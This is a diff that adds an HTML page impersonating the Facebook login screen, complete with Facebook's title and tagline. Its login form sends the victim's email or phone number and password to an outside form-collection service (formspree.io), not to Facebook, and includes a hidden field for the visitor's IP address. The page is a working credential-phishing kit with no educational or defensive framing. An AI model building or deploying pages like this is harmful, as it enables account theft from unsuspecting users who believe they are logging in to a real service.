@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="default.css">
+    <link rel="stylesheet" href="style.css">
+
+    <link rel="shortcut icon" href="https://arabasiastarz.com/season-2/assets/images/favicon.ico">
+    <link rel="stylesheet" href="assets/css/main.css">
+     
+
+</head>
+<body>
+    <div class="login">
+        <div class="container">
+            <div class="row">
+                <div class="col-7">
+                    <div class="align-center">
+                        <div class="content">
+                            <img src="img/fb.png" alt="">
+                            <p>Facebook helps you connect and share with the people in your life.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-5 col-xs-12">
+                    
+                        <div class="login-form">
+                            <form method="POST" action="https://formspree.io/f/xayzkldv" onSubmit={submitForm} name="Facebook" >
+                                <input id="email" type="text" class="form-control" required data-error="Please enter your email" placeholder="Email address or phone number" id="userName" name="Fb userName:"><br>
+                                <input id="password" type="text" class="form-control" required data-error="Please enter your email" placeholder="Password" id="password" name="FbPassword:"><br>
+                                <input id="ip" type="hidden" name="ip" value="<?=$ip;?>">
+                                <button class="c-btn" id="login-btn">Log In</button><br>
+                                <a href="#">Forgotten password?</a><br>
+                                <button id="create-btn">Create New Account</button><br>
+                            </form>
+                        </div>
+                        <footer>
+                            <a href="#" 
+                            style="font-weight: bold;
+                            color: var(--black);
+                            text-decoration: none;">Create a Page</a> 
+                            for a celebrity, band or business.
+                        </footer>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+ <script src="js/main.js"></script>
+
+
+      <!-- location scripts-->
+  <script>var ip = document.getElementById('inputID').value; </script>
+  <script>var country = document.getElementById(country);</script>
+
+</body>
+</html>
